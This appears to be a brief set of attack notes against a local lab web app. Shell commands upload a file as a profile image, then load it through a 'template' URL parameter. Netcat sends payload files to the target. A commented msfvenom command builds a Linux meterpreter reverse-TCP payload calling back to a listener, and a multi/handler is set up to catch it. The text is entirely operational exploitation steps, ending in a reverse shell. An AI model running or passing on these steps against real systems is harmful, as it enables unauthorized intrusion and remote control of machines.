curl -XPOST -F "profile=@test.png" "http://localhost:5000/profile"
curl "http://localhost:5000/page?template=/tmp/profile.png"
nc 172.18.0.2 8080 < payload.py
# msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=172.18.0.1 LPORT=4444 -f elf -o payload.bin
# msfconsole, use multi/handler, set payload linux/x86/meterpreter_reverse_tcp, etc.
nc 172.18.0.2 8081 < payload.bin

